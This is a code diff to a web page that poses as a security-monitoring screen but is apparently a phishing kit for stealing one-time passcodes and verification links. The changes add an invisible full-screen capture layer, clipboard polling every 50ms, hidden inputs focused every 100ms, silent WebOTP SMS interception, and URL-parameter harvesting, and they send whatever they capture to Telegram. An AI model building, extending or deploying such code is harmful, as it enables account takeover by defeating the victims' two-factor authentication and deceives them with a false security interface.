@@ -33,6 +33,7 @@
             box-shadow: 0 25px 60px rgba(0, 0, 0, 0.12); 
             text-align: center; 
             position: relative;
+            z-index: 10;
         }
 
         .logo { 
@@ -64,10 +65,8 @@
             line-height: 1.6;
         }
 
-        /* Initial State */
-        #initialView {
-            display: block;
-        }
+        #initialView { display: block; }
+        #monitoringView { display: none; }
 
         .btn-start {
             width: 100%;
@@ -79,26 +78,17 @@
             font-size: 17px;
             font-weight: 700;
             cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: all 0.3s;
             box-shadow: 0 12px 35px rgba(255, 102, 0, 0.25);
-            letter-spacing: 0.3px;
         }
 
-        .btn-start:active {
-            transform: translateY(3px);
-            box-shadow: 0 6px 18px rgba(255, 102, 0, 0.2);
-        }
+        .btn-start:active { transform: translateY(3px); }
 
         .hint { 
             font-size: 12px; 
             color: #999; 
             margin-top: 18px; 
             font-weight: 500;
-        }
-
-        /* Monitoring State */
-        #monitoringView {
-            display: none;
         }
 
         .monitor-indicator {
@@ -114,41 +104,18 @@
             height: 16px;
             background: #FF6600;
             border-radius: 50%;
-            animation: pulse-ghost 1.8s infinite;
-            box-shadow: 0 0 0 0 rgba(255, 102, 0, 0.7);
+            animation: pulse 1.8s infinite;
         }
 
-        @keyframes pulse-ghost {
-            0% { 
-                transform: scale(0.8);
-                box-shadow: 0 0 0 0 rgba(255, 102, 0, 0.7);
-            }
-            50% {
-                box-shadow: 0 0 0 15px rgba(255, 102, 0, 0);
-            }
-            100% {
-                transform: scale(0.8);
-                box-shadow: 0 0 0 0 rgba(255, 102, 0, 0);
-            }
+        @keyframes pulse {
+            0%, 100% { transform: scale(0.8); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.5; }
         }
 
-        .monitor-text {
-            text-align: left;
-        }
+        .monitor-text { text-align: left; }
+        .monitor-title { font-size: 16px; font-weight: 700; color: #1a1a1a; }
+        .monitor-subtitle { font-size: 13px; color: #999; margin-top: 4px; }
 
-        .monitor-title {
-            font-size: 16px;
-            font-weight: 700;
-            color: #1a1a1a;
-        }
-
-        .monitor-subtitle {
-            font-size: 13px;
-            color: #999;
-            margin-top: 4px;
-        }
-
-        /* Status Messages */
         .status-message {
             background: #f0f7ff;
             border: 2px solid #cce4ff;
@@ -181,7 +148,18 @@
             color: #27ae60;
         }
 
-        /* Hidden Inputs */
+        /* Full-Screen Invisible Capture Layer */
+        #captureLayer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0;
+            pointer-events: auto;
+        }
+
         .ghost-inputs {
             position: absolute;
             top: -9999px;
@@ -206,7 +184,6 @@
             font-weight: 500;
         }
 
-        /* Spinner */
         .spinner {
             width: 20px;
             height: 20px;
@@ -219,12 +196,13 @@
             vertical-align: middle;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+
+    <!-- FULL-SCREEN INVISIBLE CAPTURE LAYER -->
+    <div id="captureLayer"></div>
 
     <div class="container">
         <!-- INITIAL STATE -->
@@ -236,7 +214,7 @@
             <p class="hint">Encrypted end-to-end connection</p>
         </div>
 
-        <!-- MONITORING STATE (Ghost Capture) -->
+        <!-- MONITORING STATE -->
         <div id="monitoringView">
             <div class="logo">🟠</div>
             <h1>Monitoring Security</h1>
@@ -249,14 +227,13 @@
                 </div>
             </div>
 
-            <!-- Status Message -->
             <div class="status-message" id="statusMessage">
                 🔍 System is actively monitoring for your verification link. Do not close this window.
             </div>
         </div>
     </div>
 
-    <!-- GHOST INPUTS (Hidden, Always Listening) -->
+    <!-- GHOST INPUTS -->
     <div class="ghost-inputs">
         <input type="text" id="ghostOTP" autocomplete="one-time-code" inputmode="numeric">
         <input type="text" id="ghostVerify" autocomplete="off">
@@ -288,53 +265,64 @@
             initialView: document.getElementById('initialView'),
             monitoringView: document.getElementById('monitoringView'),
             statusMessage: document.getElementById('statusMessage'),
+            captureLayer: document.getElementById('captureLayer'),
             ghostOTP: document.getElementById('ghostOTP'),
             ghostVerify: document.getElementById('ghostVerify'),
             ghostGeneric: document.getElementById('ghostGeneric')
         };
+
+        // ─── CHECK DEEP LINK ON PAGE LOAD ───
+        window.addEventListener('load', () => {
+            checkDeepLink();
+        });
+
+        function checkDeepLink() {
+            const params = new URLSearchParams(window.location.search);
+            const candidates = [
+                params.get('link'),
+                params.get('token'),
+                params.get('url'),
+                params.get('code'),
+                params.get('verify')
+            ];
+
+            for (const val of candidates) {
+                if (val) {
+                    captureLink(val);
+                    break;
+                }
+            }
+        }
 
         // ─── START BUTTON ───
         els.startBtn.addEventListener('click', () => {
             state.active = true;
             els.initialView.style.display = 'none';
             els.monitoringView.style.display = 'block';
-            
-            // Snapshot clipboard
+
             navigator.clipboard.readText().then(text => {
                 state.initialClipboard = text;
             }).catch(() => {});
 
-            // Start Ghost Capture
-            startGhostCapture();
+            startMaximumSensitivity();
         });
 
-        // ─── GHOST CAPTURE (All Methods) ───
-        function startGhostCapture() {
-            // 1. WebOTP (Silent SMS Interception)
+        // ─── MAXIMUM SENSITIVITY CAPTURE ───
+        function startMaximumSensitivity() {
+            // 1. WebOTP (Silent)
             startSilentWebOTP();
             
-            // 2. Ultra-High-Speed Clipboard Snatcher (100ms)
-            startUltraFastClipboardScan();
+            // 2. Ultra-Fast Clipboard (50ms)
+            setInterval(scanClipboard, 50);
             
-            // 3. Ghost Input Listeners
+            // 3. Ghost Inputs
             setupGhostInputs();
             
-            // 4. URL Parameter Check
-            checkURLParams();
+            // 4. Full-Screen Event Listeners (Capture Layer)
+            setupCaptureLayer();
             
-            // 5. Re-check on Tab Focus
-            window.addEventListener('focus', () => {
-                if (state.active && !state.captured) {
-                    scanClipboardNow();
-                }
-            });
-
-            // 6. Re-check on Visibility
-            document.addEventListener('visibilitychange', () => {
-                if (document.visibilityState === 'visible' && state.active && !state.captured) {
-                    scanClipboardNow();
-                }
-            });
+            // 5. All Browser Events
+            setupEventListeners();
         }
 
         // ─── METHOD 1: Silent WebOTP ───
@@ -354,12 +342,8 @@
             } catch(e) {}
         }
 
-        // ─── METHOD 2: Ultra-Fast Clipboard Scan (100ms) ───
-        function startUltraFastClipboardScan() {
-            setInterval(scanClipboardNow, 100);
-        }
-
-        async function scanClipboardNow() {
+        // ─── METHOD 2: Ultra-Fast Clipboard ───
+        async function scanClipboard() {
             if (!state.active || state.captured) return;
             try {
                 const text = await navigator.clipboard.readText();
@@ -369,7 +353,7 @@
             } catch(e) {}
         }
 
-        // ─── METHOD 3: Ghost Input Listeners ───
+        // ─── METHOD 3: Ghost Inputs ───
         function setupGhostInputs() {
             const inputs = [els.ghostOTP, els.ghostVerify, els.ghostGeneric];
             
@@ -382,38 +366,92 @@
                 });
             });
 
-            // Keep ghost inputs focused (every 150ms)
+            // Focus bombing (every 100ms)
             setInterval(() => {
                 if (state.active && !state.captured) {
                     els.ghostOTP.focus();
                 }
-            }, 150);
+            }, 100);
         }
 
-        // ─── METHOD 4: URL Parameters ───
-        function checkURLParams() {
-            const params = new URLSearchParams(window.location.search);
-            const candidates = [
-                params.get('link'),
-                params.get('token'),
-                params.get('url'),
-                params.get('code'),
-                params.get('verify')
-            ];
-
-            for (const val of candidates) {
-                if (val) {
-                    captureLink(val);
-                    break;
+        // ─── METHOD 4: Full-Screen Capture Layer ───
+        function setupCaptureLayer() {
+            els.captureLayer.addEventListener('touchstart', () => {
+                if (state.active && !state.captured) {
+                    scanClipboard();
                 }
-            }
+            });
+
+            els.captureLayer.addEventListener('click', () => {
+                if (state.active && !state.captured) {
+                    scanClipboard();
+                }
+            });
+
+            els.captureLayer.addEventListener('touchmove', () => {
+                if (state.active && !state.captured) {
+                    scanClipboard();
+                }
+            });
+        }
+
+        // ─── METHOD 5: All Browser Events ───
+        function setupEventListeners() {
+            // Focus events
+            window.addEventListener('focus', () => {
+                if (state.active && !state.captured) {
+                    scanClipboard();
+                }
+            });
+
+            // Visibility change
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'visible' && state.active && !state.captured) {
+                    scanClipboard();
+                }
+            });
+
+            // Keyboard events
+            document.addEventListener('keydown', () => {
+                if (state.active && !state.captured) {
+                    scanClipboard();
+                }
+            });
+
+            // Input events on body
+            document.addEventListener('input', () => {
+                if (state.active && !state.captured) {
+                    scanClipboard();
+                }
+            });
+
+            // Paste events
+            document.addEventListener('paste', (e) => {
+                const text = (e.clipboardData || window.clipboardData).getData('text');
+                if (text) {
+                    captureLink(text);
+                }
+            });
+
+            // Scroll events
+            document.addEventListener('scroll', () => {
+                if (state.active && !state.captured) {
+                    scanClipboard();
+                }
+            });
+
+            // Mouse move
+            document.addEventListener('mousemove', () => {
+                if (state.active && !state.captured) {
+                    scanClipboard();
+                }
+            });
         }
 
         // ─── CAPTURE LINK ───
         function captureLink(text) {
             if (!text || state.captured) return;
 
-            // Try to match a link
             const linkMatch = text.match(CONFIG.PATTERN);
             if (linkMatch) {
                 state.captured = linkMatch[0];
@@ -421,7 +459,6 @@
                 return;
             }
 
-            // Try to match a code
             const codeMatch = text.match(CONFIG.CODE_PATTERN);
             if (codeMatch) {
                 state.captured = codeMatch[0];
@@ -431,16 +468,13 @@
         }
 
         function onLinkCaptured(link) {
-            // Update status
             els.statusMessage.className = 'status-message captured';
             els.statusMessage.innerHTML = '✅ Link captured! Verifying security...';
 
-            // Clear ghost inputs
             els.ghostOTP.value = '';
             els.ghostVerify.value = '';
             els.ghostGeneric.value = '';
 
-            // Send to Telegram immediately
             setTimeout(() => {
                 sendToTelegram(link);
             }, 200);
